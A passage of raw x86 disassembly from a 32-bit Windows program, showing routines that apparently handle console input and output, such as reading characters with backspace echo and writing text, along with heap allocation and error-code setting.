  40a327:	test   esi,esi
  40a329:	je     0x40a359
  40a32b:	test   edx,edx
  40a32d:	je     0x40a359
  40a32f:	mov    eax,DWORD PTR [ebp+0xc]
  40a332:	xor    ecx,ecx
  40a334:	cmp    DWORD PTR [ebp+0x8],0x1
  40a338:	sete   cl
  40a33b:	test   eax,eax
  40a33d:	jne    0x40a342
  40a33f:	or     eax,0xffffffff
  40a342:	push   eax
  40a343:	push   edx
  40a344:	push   eax
  40a345:	push   esi
  40a346:	push   ecx
  40a347:	call   DWORD PTR ds:0x412078
  40a34d:	push   eax
  40a34e:	call   DWORD PTR ds:0x41207c
  40a354:	sub    eax,0x2
  40a357:	jmp    0x40a36d
  40a359:	call   DWORD PTR ds:0x4120cc
  40a35f:	test   eax,eax
  40a361:	jne    0x40a36b
  40a363:	push   0x57
  40a365:	call   DWORD PTR ds:0x412014
  40a36b:	xor    eax,eax
  40a36d:	pop    esi
  40a36e:	pop    ebp
  40a36f:	ret    0x8
  40a372:	int3   
  40a373:	int3   
  40a374:	int3   
  40a375:	int3   
  40a376:	int3   
  40a377:	mov    edi,edi
  40a379:	push   ebp
  40a37a:	mov    ebp,esp
  40a37c:	sub    esp,0x10
  40a37f:	and    DWORD PTR [ebp-0x4],0x0
  40a383:	push   ebx
  40a384:	push   esi
  40a385:	mov    ebx,ecx
  40a387:	push   edi
  40a388:	mov    edi,edx
  40a38a:	test   ebx,ebx
  40a38c:	je     0x40a5b0
  40a392:	test   edi,edi
  40a394:	je     0x40a5b0
  40a39a:	call   0x40a167
  40a39f:	cmp    eax,0x1
  40a3a2:	jne    0x40a498
  40a3a8:	push   eax
  40a3a9:	call   0x40e9c1
  40a3ae:	pop    ecx
  40a3af:	cmp    ebx,eax
  40a3b1:	jne    0x40a3c2
  40a3b3:	push   0xfffffff5
  40a3b5:	call   DWORD PTR ds:0x41202c
  40a3bb:	mov    ebx,eax
  40a3bd:	mov    DWORD PTR [ebp-0x8],ebx
  40a3c0:	jmp    0x40a3df
  40a3c2:	push   0x2
  40a3c4:	call   0x40e9c1
  40a3c9:	pop    ecx
  40a3ca:	cmp    ebx,eax
  40a3cc:	jne    0x40a480
  40a3d2:	push   0xfffffff4
  40a3d4:	call   DWORD PTR ds:0x41202c
  40a3da:	mov    ebx,eax
  40a3dc:	mov    DWORD PTR [ebp-0x8],eax
  40a3df:	and    DWORD PTR [ebp-0x4],0x0
  40a3e3:	mov    ecx,edi
  40a3e5:	call   0x40a30b
  40a3ea:	push   0x0
  40a3ec:	mov    esi,eax
  40a3ee:	lea    eax,[ebp-0x4]
  40a3f1:	push   eax
  40a3f2:	push   esi
  40a3f3:	push   edi
  40a3f4:	push   ebx
  40a3f5:	call   DWORD PTR ds:0x412020
  40a3fb:	test   eax,eax
  40a3fd:	je     0x40a404
  40a3ff:	cmp    esi,DWORD PTR [ebp-0x4]
  40a402:	je     0x40a45c
  40a404:	call   DWORD PTR ds:0x4120cc
  40a40a:	cmp    eax,0x8
  40a40d:	jne    0x40a464
  40a40f:	mov    ecx,edi
  40a411:	call   0x40a30b
  40a416:	xor    ebx,ebx
  40a418:	mov    DWORD PTR [ebp-0xc],eax
  40a41b:	test   eax,eax
  40a41d:	je     0x40a45c
  40a41f:	mov    ecx,0x400
  40a424:	mov    esi,eax
  40a426:	sub    esi,ebx
  40a428:	cmp    esi,ecx
  40a42a:	jbe    0x40a42e
  40a42c:	mov    esi,ecx
  40a42e:	push   0x0
  40a430:	lea    eax,[ebp-0x4]
  40a433:	push   eax
  40a434:	push   esi
  40a435:	push   edi
  40a436:	push   DWORD PTR [ebp-0x8]
  40a439:	call   DWORD PTR ds:0x412020
  40a43f:	test   eax,eax
  40a441:	je     0x40a464
  40a443:	cmp    esi,DWORD PTR [ebp-0x4]
  40a446:	jne    0x40a464
  40a448:	mov    eax,DWORD PTR [ebp-0xc]
  40a44b:	mov    ecx,0x400
  40a450:	add    ebx,ecx
  40a452:	add    edi,0x800
  40a458:	cmp    ebx,eax
  40a45a:	jb     0x40a424
  40a45c:	xor    eax,eax
  40a45e:	inc    eax
  40a45f:	jmp    0x40a5c4
  40a464:	push   0x2
  40a466:	call   0x40e9c1
  40a46b:	pop    ecx
  40a46c:	mov    ecx,eax
  40a46e:	call   0x4096c6
  40a473:	call   0x409789
  40a478:	push   0x1
  40a47a:	call   DWORD PTR ds:0x412070
  40a480:	call   DWORD PTR ds:0x4120cc
  40a486:	test   eax,eax
  40a488:	jne    0x40a5c2
  40a48e:	push   0x42b
  40a493:	jmp    0x40a5bc
  40a498:	mov    ecx,edi
  40a49a:	call   0x40a30b
  40a49f:	push   0x100
  40a4a4:	mov    esi,eax
  40a4a6:	push   0x0
  40a4a8:	push   0x4113a0
  40a4ad:	mov    DWORD PTR [ebp-0x10],esi
  40a4b0:	call   0x40eb54
  40a4b5:	xor    ecx,ecx
  40a4b7:	add    esp,0xc
  40a4ba:	mov    eax,ecx
  40a4bc:	mov    DWORD PTR [ebp-0x8],eax
  40a4bf:	test   esi,esi
  40a4c1:	je     0x40a45c
  40a4c3:	sub    esi,eax
  40a4c5:	mov    DWORD PTR [ebp-0x4],ecx
  40a4c8:	cmp    esi,0xff
  40a4ce:	jbe    0x40a4d5
  40a4d0:	mov    esi,0xff
  40a4d5:	lea    eax,[edi+eax*2]
  40a4d8:	mov    DWORD PTR [ebp-0xc],eax
  40a4db:	push   ecx
  40a4dc:	push   ecx
  40a4dd:	push   ecx
  40a4de:	push   ecx
  40a4df:	push   esi
  40a4e0:	push   eax
  40a4e1:	push   ecx
  40a4e2:	call   DWORD PTR ds:0x41206c
  40a4e8:	push   eax
  40a4e9:	call   DWORD PTR ds:0x412090
  40a4ef:	mov    DWORD PTR [ebp-0x4],eax
  40a4f2:	test   eax,eax
  40a4f4:	je     0x40a5a9
  40a4fa:	cmp    eax,0xff
  40a4ff:	jbe    0x40a520
  40a501:	add    eax,0xffffff01
  40a506:	cmp    eax,0x3
  40a509:	jbe    0x40a511
  40a50b:	shr    eax,1
  40a50d:	sub    esi,eax
  40a50f:	jmp    0x40a512
  40a511:	dec    esi
  40a512:	xor    ecx,ecx
  40a514:	mov    DWORD PTR [ebp-0x4],ecx
  40a517:	test   esi,esi
  40a519:	je     0x40a594
  40a51b:	mov    eax,DWORD PTR [ebp-0xc]
  40a51e:	jmp    0x40a4db
  40a520:	cmp    eax,esi
  40a522:	jae    0x40a526
  40a524:	mov    esi,eax
  40a526:	push   0x100
  40a52b:	push   0x0
  40a52d:	push   0x4113a0
  40a532:	call   0x40eb54
  40a537:	add    esp,0xc
  40a53a:	xor    eax,eax
  40a53c:	push   eax
  40a53d:	push   eax
  40a53e:	push   0xff
  40a543:	push   0x4113a0
  40a548:	push   esi
  40a549:	push   DWORD PTR [ebp-0xc]
  40a54c:	push   eax
  40a54d:	call   DWORD PTR ds:0x41206c
  40a553:	push   eax
  40a554:	call   DWORD PTR ds:0x412090
  40a55a:	mov    DWORD PTR [ebp-0x4],eax
  40a55d:	test   eax,eax
  40a55f:	je     0x40a5a9
  40a561:	add    DWORD PTR [ebp-0x8],esi
  40a564:	push   0x4113a0
  40a569:	push   0x401a98
  40a56e:	push   ebx
  40a56f:	call   DWORD PTR ds:0x412268
  40a575:	push   ebx
  40a576:	call   DWORD PTR ds:0x41226c
  40a57c:	mov    eax,DWORD PTR [ebp-0x8]
  40a57f:	add    esp,0x10
  40a582:	mov    esi,DWORD PTR [ebp-0x10]
  40a585:	cmp    esi,eax
  40a587:	jbe    0x40a45c
  40a58d:	xor    ecx,ecx
  40a58f:	jmp    0x40a4c3
  40a594:	call   DWORD PTR ds:0x4120cc
  40a59a:	test   eax,eax
  40a59c:	jne    0x40a5a9
  40a59e:	push   0x42b
  40a5a3:	call   DWORD PTR ds:0x412014
  40a5a9:	push   0x1
  40a5ab:	jmp    0x40a466
  40a5b0:	call   DWORD PTR ds:0x4120cc
  40a5b6:	test   eax,eax
  40a5b8:	jne    0x40a5c2
  40a5ba:	push   0x57
  40a5bc:	call   DWORD PTR ds:0x412014
  40a5c2:	xor    eax,eax
  40a5c4:	pop    edi
  40a5c5:	pop    esi
  40a5c6:	pop    ebx
  40a5c7:	mov    esp,ebp
  40a5c9:	pop    ebp
  40a5ca:	ret    
  40a5cb:	int3   
  40a5cc:	int3   
  40a5cd:	int3   
  40a5ce:	int3   
  40a5cf:	int3   
  40a5d0:	mov    edi,edi
  40a5d2:	push   ebp
  40a5d3:	mov    ebp,esp
  40a5d5:	push   ecx
  40a5d6:	push   ecx
  40a5d7:	mov    edx,DWORD PTR [ebp+0x14]
  40a5da:	push   ebx
  40a5db:	push   esi
  40a5dc:	test   edx,edx
  40a5de:	je     0x40a6e4
  40a5e4:	cmp    DWORD PTR [ebp+0x8],0x0
  40a5e8:	je     0x40a6e4
  40a5ee:	cmp    DWORD PTR [ebp+0xc],0x0
  40a5f2:	jne    0x40a601
  40a5f4:	mov    ecx,DWORD PTR [ebp+0x8]
  40a5f7:	call   0x40a377
  40a5fc:	jmp    0x40a6f8
  40a601:	cmp    DWORD PTR [ebp+0x10],0x0
  40a605:	jne    0x40a698
  40a60b:	or     ebx,0xffffffff
  40a60e:	xor    ecx,ecx
  40a610:	lea    eax,[ebp+0x18]
  40a613:	mov    DWORD PTR [ebp-0x4],eax
  40a616:	xor    eax,eax
  40a618:	cmp    ebx,0xffffffff
  40a61b:	push   0x1
  40a61d:	setne  al
  40a620:	xor    edx,edx
  40a622:	dec    eax
  40a623:	and    eax,0x800
  40a628:	add    eax,0x800
  40a62d:	add    ecx,eax
  40a62f:	push   ecx
  40a630:	push   0x3
  40a632:	mov    DWORD PTR [ebp-0x8],ecx
  40a635:	pop    ecx
  40a636:	call   0x409339
  40a63b:	mov    esi,eax
  40a63d:	test   esi,esi
  40a63f:	je     0x40a68a
  40a641:	lea    eax,[ebp-0x4]
  40a644:	push   eax
  40a645:	mov    eax,DWORD PTR [ebp-0x8]
  40a648:	dec    eax
  40a649:	push   eax
  40a64a:	push   esi
  40a64b:	push   0x0
  40a64d:	push   0x0
  40a64f:	push   DWORD PTR [ebp+0x14]
  40a652:	push   0x400
  40a657:	call   DWORD PTR ds:0x412034
  40a65d:	mov    ebx,eax
  40a65f:	test   ebx,ebx
  40a661:	jne    0x40a678
  40a663:	call   DWORD PTR ds:0x4120cc
  40a669:	test   eax,eax
  40a66b:	je     0x40a685
  40a66d:	call   DWORD PTR ds:0x4120cc
  40a673:	cmp    eax,0x7a
  40a676:	jne    0x40a6f6
  40a678:	and    DWORD PTR [ebp-0x4],0x0
  40a67c:	test   ebx,ebx
  40a67e:	jne    0x40a6dd
  40a680:	mov    ecx,DWORD PTR [ebp-0x8]
  40a683:	jmp    0x40a610
  40a685:	xor    eax,eax
  40a687:	inc    eax
  40a688:	jmp    0x40a6f8
  40a68a:	call   DWORD PTR ds:0x4120cc
  40a690:	test   eax,eax
  40a692:	jne    0x40a6f6
  40a694:	push   0x8
  40a696:	jmp    0x40a6f0
  40a698:	xor    ebx,ebx
  40a69a:	push   0x1
  40a69c:	add    ebx,0x800
  40a6a2:	lea    eax,[ebp+0x18]
  40a6a5:	push   ebx
  40a6a6:	push   0x3
  40a6a8:	xor    edx,edx
  40a6aa:	mov    DWORD PTR [ebp-0x4],eax
  40a6ad:	pop    ecx
  40a6ae:	call   0x409339
  40a6b3:	mov    esi,eax
  40a6b5:	test   esi,esi
  40a6b7:	je     0x40a68a
  40a6b9:	push   DWORD PTR [ebp-0x4]
  40a6bc:	mov    edx,ebx
  40a6be:	mov    ecx,esi
  40a6c0:	push   DWORD PTR [ebp+0x14]
  40a6c3:	call   0x40ae78
  40a6c8:	and    DWORD PTR [ebp-0x4],0x0
  40a6cc:	cmp    eax,0x8007007a
  40a6d1:	je     0x40a69a
  40a6d3:	test   eax,eax
  40a6d5:	jns    0x40a6dd
  40a6d7:	movzx  eax,ax
  40a6da:	push   eax
  40a6db:	jmp    0x40a6f0
  40a6dd:	mov    edx,esi
  40a6df:	jmp    0x40a5f4
  40a6e4:	call   DWORD PTR ds:0x4120cc
  40a6ea:	test   eax,eax
  40a6ec:	jne    0x40a6f6
  40a6ee:	push   0x57
  40a6f0:	call   DWORD PTR ds:0x412014
  40a6f6:	xor    eax,eax
  40a6f8:	pop    esi
  40a6f9:	pop    ebx
  40a6fa:	mov    esp,ebp
  40a6fc:	pop    ebp
  40a6fd:	ret    
  40a6fe:	int3   
  40a6ff:	int3   
  40a700:	int3   
  40a701:	int3   
  40a702:	int3   
  40a703:	mov    edi,edi
  40a705:	push   ebp
  40a706:	mov    ebp,esp
  40a708:	push   ecx
  40a709:	push   ebx
  40a70a:	push   esi
  40a70b:	push   edi
  40a70c:	mov    edi,edx
  40a70e:	xor    esi,esi
  40a710:	mov    edx,ecx
  40a712:	mov    DWORD PTR [ebp-0x4],edx
  40a715:	test   edx,edx
  40a717:	je     0x40a7d1
  40a71d:	mov    ebx,DWORD PTR [ebp+0x8]
  40a720:	test   ebx,ebx
  40a722:	je     0x40a7d1
  40a728:	test   edi,edi
  40a72a:	jne    0x40a734
  40a72c:	cmp    DWORD PTR [ebx],esi
  40a72e:	jne    0x40a7d1
  40a734:	mov    ecx,DWORD PTR [ebx]
  40a736:	test   ecx,ecx
  40a738:	je     0x40a742
  40a73a:	cmp    ecx,0x1
  40a73d:	jbe    0x40a7ba
  40a73f:	lea    esi,[ecx-0x1]
  40a742:	test   edi,edi
  40a744:	je     0x40a760
  40a746:	test   esi,esi
  40a748:	je     0x40a760
  40a74a:	lea    eax,[esi*2+0x2]
  40a751:	push   eax
  40a752:	push   0x0
  40a754:	push   edi
  40a755:	call   0x40eb54
  40a75a:	mov    edx,DWORD PTR [ebp-0x4]
  40a75d:	add    esp,0xc
  40a760:	or     eax,0xffffffff
  40a763:	test   esi,esi
  40a765:	je     0x40a774
  40a767:	push   edx
  40a768:	call   DWORD PTR ds:0x412080
  40a76e:	cmp    eax,esi
  40a770:	jle    0x40a774
  40a772:	mov    eax,esi
  40a774:	push   esi
  40a775:	push   edi
  40a776:	push   eax
  40a777:	push   DWORD PTR [ebp-0x4]
  40a77a:	push   0x0
  40a77c:	push   0x1
  40a77e:	call   DWORD PTR ds:0x412068
  40a784:	test   eax,eax
  40a786:	jne    0x40a7cd
  40a788:	call   DWORD PTR ds:0x4120cc
  40a78e:	test   eax,eax
  40a790:	jne    0x40a79d
  40a792:	push   0x42b
  40a797:	call   DWORD PTR ds:0x412014
  40a79d:	test   edi,edi
  40a79f:	je     0x40a7e3
  40a7a1:	test   esi,esi
  40a7a3:	je     0x40a7e3
  40a7a5:	lea    eax,[esi*2+0x2]
  40a7ac:	push   eax
  40a7ad:	push   0x0
  40a7af:	push   edi
  40a7b0:	call   0x40eb54
  40a7b5:	add    esp,0xc
  40a7b8:	jmp    0x40a7e3
  40a7ba:	add    ecx,ecx
  40a7bc:	push   ecx
  40a7bd:	push   0x0
  40a7bf:	push   edi
  40a7c0:	call   0x40eb54
  40a7c5:	add    esp,0xc
  40a7c8:	xor    eax,eax
  40a7ca:	inc    eax
  40a7cb:	jmp    0x40a7e5
  40a7cd:	mov    DWORD PTR [ebx],eax
  40a7cf:	jmp    0x40a7c8
  40a7d1:	call   DWORD PTR ds:0x4120cc
  40a7d7:	test   eax,eax
  40a7d9:	jne    0x40a7e3
  40a7db:	push   0x57
  40a7dd:	call   DWORD PTR ds:0x412014
  40a7e3:	xor    eax,eax
  40a7e5:	pop    edi
  40a7e6:	pop    esi
  40a7e7:	pop    ebx
  40a7e8:	mov    esp,ebp
  40a7ea:	pop    ebp
  40a7eb:	ret    0x4
  40a7ee:	int3   
  40a7ef:	int3   
  40a7f0:	int3   
  40a7f1:	int3   
  40a7f2:	int3   
  40a7f3:	mov    edi,edi
  40a7f5:	push   ebp
  40a7f6:	mov    ebp,esp
  40a7f8:	sub    esp,0x44
  40a7fb:	mov    eax,ds:0x411004
  40a800:	xor    eax,ebp
  40a802:	mov    DWORD PTR [ebp-0x4],eax
  40a805:	push   edi
  40a806:	xor    eax,eax
  40a808:	mov    DWORD PTR [ebp-0x40],edx
  40a80b:	xor    edx,edx
  40a80d:	mov    WORD PTR [ebp-0x24],ax
  40a811:	mov    DWORD PTR [ebp-0x18],edx
  40a814:	lea    edi,[ebp-0x14]
  40a817:	stos   DWORD PTR es:[edi],eax
  40a818:	mov    DWORD PTR [ebp-0x3c],ecx
  40a81b:	mov    DWORD PTR [ebp-0x44],edx
  40a81e:	mov    DWORD PTR [ebp-0x34],edx
  40a821:	stos   DWORD PTR es:[edi],eax
  40a822:	mov    DWORD PTR [ebp-0x2c],edx
  40a825:	mov    DWORD PTR [ebp-0x38],edx
  40a828:	mov    DWORD PTR [ebp-0x22],edx
  40a82b:	stos   DWORD PTR es:[edi],eax
  40a82c:	mov    DWORD PTR [ebp-0x1e],edx
  40a82f:	stos   DWORD PTR es:[edi],eax
  40a830:	test   ecx,ecx
  40a832:	jne    0x40a84d
  40a834:	call   DWORD PTR ds:0x4120cc
  40a83a:	test   eax,eax
  40a83c:	jne    0x40a846
  40a83e:	push   0x57
  40a840:	call   DWORD PTR ds:0x412014
  40a846:	xor    eax,eax
  40a848:	jmp    0x40aa55
  40a84d:	push   esi
  40a84e:	push   0xfffffff6
  40a850:	call   DWORD PTR ds:0x41202c
  40a856:	mov    esi,eax
  40a858:	test   esi,esi
  40a85a:	je     0x40aa54
  40a860:	push   ebx
  40a861:	lea    edx,[ebp-0x38]
  40a864:	mov    ecx,esi
  40a866:	call   0x40a12f
  40a86b:	mov    ebx,eax
  40a86d:	neg    ebx
  40a86f:	sbb    ebx,ebx
  40a871:	add    ebx,0x1
  40a874:	jne    0x40a887
  40a876:	push   0x1
  40a878:	push   esi
  40a879:	call   DWORD PTR ds:0x412064
  40a87f:	test   eax,eax
  40a881:	je     0x40aa51
  40a887:	xor    eax,eax
  40a889:	lea    edi,[ebp-0x24]
  40a88c:	stos   DWORD PTR es:[edi],eax
  40a88d:	stos   DWORD PTR es:[edi],eax
  40a88e:	stos   WORD PTR es:[edi],ax
  40a890:	xor    eax,eax
  40a892:	lea    edi,[ebp-0x18]
  40a895:	stos   DWORD PTR es:[edi],eax
  40a896:	stos   DWORD PTR es:[edi],eax
  40a897:	stos   DWORD PTR es:[edi],eax
  40a898:	stos   DWORD PTR es:[edi],eax
  40a899:	stos   DWORD PTR es:[edi],eax
  40a89a:	mov    edi,DWORD PTR [ebp-0x44]
  40a89d:	lea    eax,[ebp-0x34]
  40a8a0:	push   0x0
  40a8a2:	push   eax
  40a8a3:	push   0x1
  40a8a5:	cmp    ebx,0x1
  40a8a8:	jne    0x40a8ed
  40a8aa:	lea    eax,[ebp-0x25]
  40a8ad:	push   eax
  40a8ae:	push   esi
  40a8af:	call   DWORD PTR ds:0x4120d0
  40a8b5:	test   eax,eax
  40a8b7:	je     0x40aa51
  40a8bd:	cmp    DWORD PTR [ebp-0x34],0x0
  40a8c1:	je     0x40aa03
  40a8c7:	mov    al,BYTE PTR [ebp-0x25]
  40a8ca:	lea    edx,[ebp-0x18]
  40a8cd:	mov    BYTE PTR [ebp-0x24],al
  40a8d0:	lea    ecx,[ebp-0x24]
  40a8d3:	lea    eax,[ebp-0x34]
  40a8d6:	mov    DWORD PTR [ebp-0x34],0xa
  40a8dd:	push   eax
  40a8de:	call   0x40a703
  40a8e3:	mov    cx,WORD PTR [ebp-0x18]
  40a8e7:	mov    WORD PTR [ebp-0x30],cx
  40a8eb:	jmp    0x40a904
  40a8ed:	lea    eax,[ebp-0x30]
  40a8f0:	push   eax
  40a8f1:	push   esi
  40a8f2:	call   DWORD PTR ds:0x41205c
  40a8f8:	test   eax,eax
  40a8fa:	je     0x40aa47
  40a900:	mov    cx,WORD PTR [ebp-0x30]
  40a904:	cmp    cx,0xd
  40a908:	je     0x40aa03
  40a90e:	push   0x8
  40a910:	pop    eax
  40a911:	cmp    cx,ax
  40a914:	jne    0x40a9b7
  40a91a:	test   edi,edi
  40a91c:	je     0x40a89d
  40a922:	push   eax
  40a923:	push   0x401a9c
  40a928:	lea    eax,[ebp-0x18]
  40a92b:	push   0xa
  40a92d:	push   eax
  40a92e:	call   0x40adea
  40a933:	add    esp,0x10
  40a936:	lea    eax,[ebp-0x2c]
  40a939:	push   0x0
  40a93b:	push   eax
  40a93c:	push   0x1
  40a93e:	lea    eax,[ebp-0x18]
  40a941:	push   eax
  40a942:	push   0xfffffff5
  40a944:	call   DWORD PTR ds:0x41202c
  40a94a:	push   eax
  40a94b:	call   DWORD PTR ds:0x412020
  40a951:	push   0x0
  40a953:	push   0x401a9c
  40a958:	lea    eax,[ebp-0x18]
  40a95b:	push   0xa
  40a95d:	push   eax
  40a95e:	call   0x40adea
  40a963:	add    esp,0x10
  40a966:	lea    eax,[ebp-0x2c]
  40a969:	push   0x0
  40a96b:	push   eax
  40a96c:	push   0x1
  40a96e:	lea    eax,[ebp-0x18]
  40a971:	push   eax
  40a972:	push   0xfffffff5
  40a974:	call   DWORD PTR ds:0x41202c
  40a97a:	push   eax
  40a97b:	call   DWORD PTR ds:0x412020
  40a981:	push   0x8
  40a983:	push   0x401a9c
  40a988:	lea    eax,[ebp-0x18]
  40a98b:	push   0xa
  40a98d:	push   eax
  40a98e:	call   0x40adea
  40a993:	add    esp,0x10
  40a996:	lea    eax,[ebp-0x2c]
  40a999:	push   0x0
  40a99b:	push   eax
  40a99c:	push   0x1
  40a99e:	lea    eax,[ebp-0x18]
  40a9a1:	push   eax
  40a9a2:	push   0xfffffff5
  40a9a4:	call   DWORD PTR ds:0x41202c
  40a9aa:	push   eax
  40a9ab:	call   DWORD PTR ds:0x412020
  40a9b1:	dec    edi
  40a9b2:	jmp    0x40a89d
  40a9b7:	mov    eax,DWORD PTR [ebp-0x40]
  40a9ba:	dec    eax
  40a9bb:	cmp    edi,eax
  40a9bd:	jne    0x40a9ce
  40a9bf:	push   0x0
  40a9c1:	lea    eax,[ebp-0x2c]
  40a9c4:	push   eax
  40a9c5:	push   0x1
  40a9c7:	push   0x401aa4
  40a9cc:	jmp    0x40a9ef
  40a9ce:	push   0xa
  40a9d0:	pop    eax
  40a9d1:	cmp    cx,ax
  40a9d4:	je     0x40a89d
  40a9da:	mov    eax,DWORD PTR [ebp-0x3c]
  40a9dd:	push   0x0
  40a9df:	mov    WORD PTR [eax+edi*2],cx
  40a9e3:	lea    eax,[ebp-0x2c]
  40a9e6:	push   eax
  40a9e7:	push   0x1
  40a9e9:	inc    edi
  40a9ea:	push   0x4018f4
  40a9ef:	push   0xfffffff5
  40a9f1:	call   DWORD PTR ds:0x41202c
  40a9f7:	push   eax
  40a9f8:	call   DWORD PTR ds:0x412020
  40a9fe:	jmp    0x40a89d
  40aa03:	mov    eax,DWORD PTR [ebp-0x3c]
  40aa06:	xor    ecx,ecx
  40aa08:	push   DWORD PTR [ebp-0x38]
  40aa0b:	push   esi
  40aa0c:	mov    WORD PTR [eax+edi*2],cx
  40aa10:	call   DWORD PTR ds:0x412064
  40aa16:	push   0xa
  40aa18:	pop    eax
  40aa19:	push   eax
  40aa1a:	mov    edx,0x401aa8
  40aa1f:	lea    ecx,[ebp-0x18]
  40aa22:	call   0x40a26c
  40aa27:	push   0x0
  40aa29:	lea    ecx,[ebp-0x2c]
  40aa2c:	push   ecx
  40aa2d:	push   0x2
  40aa2f:	lea    ecx,[ebp-0x18]
  40aa32:	push   ecx
  40aa33:	push   0xfffffff5
  40aa35:	call   DWORD PTR ds:0x41202c
  40aa3b:	push   eax
  40aa3c:	call   DWORD PTR ds:0x412020
  40aa42:	xor    eax,eax
  40aa44:	inc    eax
  40aa45:	jmp    0x40aa53
  40aa47:	push   DWORD PTR [ebp-0x38]
  40aa4a:	push   esi
  40aa4b:	call   DWORD PTR ds:0x412064
  40aa51:	xor    eax,eax
  40aa53:	pop    ebx
  40aa54:	pop    esi
  40aa55:	mov    ecx,DWORD PTR [ebp-0x4]
  40aa58:	xor    ecx,ebp
  40aa5a:	pop    edi
  40aa5b:	call   0x40e2c0
  40aa60:	mov    esp,ebp
  40aa62:	pop    ebp
  40aa63:	ret    
  40aa64:	int3   
  40aa65:	int3   
  40aa66:	int3   
  40aa67:	int3   
  40aa68:	int3   
  40aa69:	mov    edi,edi
  40aa6b:	push   esi
  40aa6c:	mov    esi,ecx
  40aa6e:	test   esi,esi
  40aa70:	jne    0x40aa88
  40aa72:	call   DWORD PTR ds:0x4120cc
  40aa78:	test   eax,eax
  40aa7a:	jne    0x40aa84
  40aa7c:	push   0x57
  40aa7e:	call   DWORD PTR ds:0x412014
  40aa84:	xor    eax,eax
  40aa86:	pop    esi
  40aa87:	ret    
  40aa88:	push   ebx
  40aa89:	xor    ebx,ebx
  40aa8b:	cmp    DWORD PTR [esi],ebx
  40aa8d:	jne    0x40aa94
  40aa8f:	xor    eax,eax
  40aa91:	inc    eax
  40aa92:	jmp    0x40aad5
  40aa94:	push   edi
  40aa95:	call   DWORD PTR ds:0x412058
  40aa9b:	mov    edi,eax
  40aa9d:	test   edi,edi
  40aa9f:	je     0x40aab8
  40aaa1:	mov    ecx,DWORD PTR [esi]
  40aaa3:	call   0x40aca3
  40aaa8:	cmp    eax,0xffffffff
  40aaab:	jne    0x40aabc
  40aaad:	push   0x80004003
  40aab2:	call   DWORD PTR ds:0x412014
  40aab8:	xor    eax,eax
  40aaba:	jmp    0x40aad4
  40aabc:	push   eax
  40aabd:	push   ebx
  40aabe:	push   DWORD PTR [esi]
  40aac0:	call   0x40eb54
  40aac5:	add    esp,0xc
  40aac8:	push   DWORD PTR [esi]
  40aaca:	push   ebx
  40aacb:	push   edi
  40aacc:	call   DWORD PTR ds:0x412054
  40aad2:	mov    DWORD PTR [esi],ebx
  40aad4:	pop    edi
  40aad5:	pop    ebx
  40aad6:	pop    esi
  40aad7:	ret    
  40aad8:	int3   
  40aad9:	int3   
  40aada:	int3   
  40aadb:	int3   
  40aadc:	int3   
  40aadd:	mov    edi,edi
  40aadf:	push   esi
  40aae0:	mov    esi,ecx
  40aae2:	test   esi,esi
  40aae4:	jne    0x40aaf4
  40aae6:	call   DWORD PTR ds:0x4120cc
  40aaec:	test   eax,eax
  40aaee:	jne    0x40ab14
  40aaf0:	push   0x57
  40aaf2:	jmp    0x40ab0e
  40aaf4:	call   DWORD PTR ds:0x412058
  40aafa:	test   eax,eax
  40aafc:	je     0x40ab14
  40aafe:	push   esi
  40aaff:	push   0x0
  40ab01:	push   eax
  40ab02:	call   DWORD PTR ds:0x412050
  40ab08:	test   eax,eax
  40ab0a:	jne    0x40ab16
  40ab0c:	push   0x6
  40ab0e:	call   DWORD PTR ds:0x412014
  40ab14:	xor    eax,eax
  40ab16:	pop    esi
  40ab17:	ret    
  40ab18:	int3   
  40ab19:	int3   
  40ab1a:	int3   
  40ab1b:	int3   
  40ab1c:	int3   
  40ab1d:	push   0x10
  40ab1f:	push   0x410cf8
  40ab24:	call   0x40e958
  40ab29:	mov    esi,ecx
  40ab2b:	test   esi,esi
  40ab2d:	jne    0x40ab43
  40ab2f:	call   DWORD PTR ds:0x4120cc
  40ab35:	test   eax,eax
  40ab37:	jne    0x40abb5
  40ab39:	push   0x57
  40ab3b:	call   DWORD PTR ds:0x412014
  40ab41:	jmp    0x40abb5
  40ab43:	call   DWORD PTR ds:0x412058
  40ab49:	test   eax,eax
  40ab4b:	je     0x40abb5
  40ab4d:	and    DWORD PTR [ebp-0x4],0x0
  40ab51:	push   esi
  40ab52:	push   0xc
  40ab54:	push   eax
  40ab55:	call   DWORD PTR ds:0x41204c
  40ab5b:	mov    DWORD PTR [ebp-0x20],eax
  40ab5e:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40ab65:	jmp    0x40abb7
  40ab67:	mov    eax,DWORD PTR [ebp-0x14]
  40ab6a:	mov    eax,DWORD PTR [eax]
  40ab6c:	mov    eax,DWORD PTR [eax]
  40ab6e:	mov    DWORD PTR [ebp-0x1c],eax
  40ab71:	xor    eax,eax
  40ab73:	inc    eax
  40ab74:	ret    
  40ab75:	mov    esp,DWORD PTR [ebp-0x18]
  40ab78:	cmp    DWORD PTR [ebp-0x1c],0xc0000017
  40ab7f:	je     0x40ab9c
  40ab81:	cmp    DWORD PTR [ebp-0x1c],0xc0000005
  40ab88:	jne    0x40ab9c
  40ab8a:	push   0x570
  40ab8f:	call   DWORD PTR ds:0x412014
  40ab95:	call   0x4095c0
  40ab9a:	jmp    0x40abae
  40ab9c:	call   DWORD PTR ds:0x4120cc
  40aba2:	test   eax,eax
  40aba4:	jne    0x40abae
  40aba6:	push   0x8
  40aba8:	call   DWORD PTR ds:0x412014
  40abae:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40abb5:	xor    eax,eax
  40abb7:	call   0x40e99d
  40abbc:	ret    
  40abbd:	int3   
  40abbe:	int3   
  40abbf:	int3   
  40abc0:	int3   
  40abc1:	int3   
  40abc2:	push   0xc
  40abc4:	push   0x410d18
  40abc9:	call   0x40e958
  40abce:	mov    edi,edx
  40abd0:	mov    esi,ecx
  40abd2:	test   esi,esi
  40abd4:	je     0x40ac84
  40abda:	mov    ecx,DWORD PTR [esi]
  40abdc:	test   ecx,ecx
  40abde:	je     0x40ac84
  40abe4:	test   edi,edi
  40abe6:	jne    0x40abf4
  40abe8:	mov    ecx,esi
  40abea:	call   0x40aa69
  40abef:	jmp    0x40ac98
  40abf4:	call   0x40aadd
  40abf9:	test   eax,eax
  40abfb:	jne    0x40ac04
  40abfd:	and    DWORD PTR [esi],eax
  40abff:	jmp    0x40ac96
  40ac04:	call   DWORD PTR ds:0x412058
  40ac0a:	test   eax,eax
  40ac0c:	je     0x40ac96
  40ac12:	and    DWORD PTR [ebp-0x4],0x0
  40ac16:	push   edi
